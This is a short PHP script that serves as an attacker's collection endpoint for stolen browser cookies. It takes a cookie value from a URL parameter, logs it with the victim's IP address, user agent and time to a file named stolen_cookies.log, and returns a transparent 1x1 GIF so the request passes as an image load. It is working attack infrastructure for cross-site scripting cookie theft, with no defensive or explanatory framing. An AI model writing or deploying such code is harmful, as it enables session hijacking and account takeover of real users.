<?php
// Create logs directory if it doesn't exist
if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
}

$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$logEntry = "[$timestamp] Cookie stolen from $ip ($userAgent): $cookie\n";
file_put_contents('logs/stolen_cookies.log', $logEntry, FILE_APPEND);

// Return a small transparent GIF to avoid browser errors
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'); 